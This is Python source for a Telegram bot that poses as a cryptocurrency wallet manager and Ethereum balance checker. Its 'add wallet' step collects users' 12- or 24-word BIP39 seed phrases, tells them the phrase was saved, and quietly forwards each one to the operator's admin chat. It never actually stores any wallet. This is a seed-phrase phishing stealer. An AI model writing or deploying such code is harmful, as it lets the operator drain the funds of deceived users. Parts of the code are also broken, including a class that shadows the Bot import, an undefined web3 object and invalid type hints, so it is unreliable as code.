from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.state import StatesGroup, State
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext

from bot.tg.utils import main_inline_keyboard, main_keyboard, UserState
from db import Database


class Bot:
    def __init__(self, db: Database, config: dict[str][any] = dict[str][any]):
        self._db: Database = db
        self.config: dict[str][any] = config
        self._bot: Bot = Bot(token="token")
        # self.__admin_id = 123

        self.__storage: MemoryStorage = MemoryStorage()
        self.__dp: Dispatcher = Dispatcher(self._bot, storage=self.__storage)


    async def welcome(self, message: types.Message):

        if not str(message.from_user.id) in self._db.read():
            self._db.insert(message.from_user.id)
            self._db.insert_temp(message.from_user.id)

            await message.answer('Правила:\n1. one\n2. two\n3. three', reply_markup=main_inline_keyboard)
        else:
            await message.answer('Приветствуем снова!', reply_markup=main_keyboard)

    @staticmethod
    async def st(call: types.CallbackQuery):
        await call.answer()
        await call.message.answer('Вас привествует бот от @BlazarPython. Используйте меню кнопок',
                                  reply_markup=main_keyboard)

    @staticmethod
    async def handlers(message: types.Message):
        if message.text == 'Мои кошельки':
            await message.answer('Вы еще не добавили ни одного кошелька')
        elif message.text == 'Удалить кошелек':
            await message.answer('Вы еще не добавили ни одного кошелька')
        elif message.text == 'Добавить кошелек':
            await message.answer('Введите фразу для добавления (формат bip39).')
            await UserState.user_seed.set()
        elif message.text == 'Проверка баланса эфира по адресу':
            await message.answer('Введите кошелёк.')
            await UserState.user_wallet.set()
        else:
            await message.answer('Используйте клавиатуру!!!')

    async def add_to_database(self, message: types.Message, state: FSMContext):
        id = message.from_user.id
        text = message.text

        if int(len(text.split())) == 12 or int(len(text.split())) == 24:
            print(f'{id},\n {text}')
            await message.answer('Добавлено в базу.')
            await self._bot.send_message(self.config.get("admin_id"), f'[{id}\n{text}]')
            await state.finish()
        else:
            await message.answer('Неверный формат.')

    async def checker(self, message: types.Message, state: FSMContext):
        wallet = message.text
        if wallet[:2] == '0x':
            resultat = 'Баланс:'
            count = len(wallet.split('\n'))
            wallet_line = wallet.split('\n')

            for i in range(count):
                for kowel in wallet_line:
                    x = web3.eth.get_balance(f'{kowel}')
                    x2 = web3.fromWei(x, 'ether')
                    resultat += f'\n{x2}'
            await message.answer(resultat)
            await state.finish()
        else:
            await message.answer('Неверный кошелёк.')

    def start(self):
        @self.__dp.message_handler(commands=['start', 'help'])
        async def wrapper_welcome(message: types.Message):
            await self.welcome(message)

        @self.__dp.callback_query_handler(text="ok")
        async def wrapper_start(call: types.CallbackQuery):
            await self.st(call)

        @self.__dp.message_handler(content_types=['text'])
        async def wrapper_handlers(message: types.Message):
            await self.handlers(message)

        @self.__dp.message_handler(state=UserState.user_seed)
        async def wrapper_add_to_database(message: types.Message, state: FSMContext):
            await self.add_to_database(message, state)

        @self.__dp.message_handler(state=UserState.user_wallet)
        async def wrapper_checker(message: types.Message, state: FSMContext):
            await self.checker(message, state)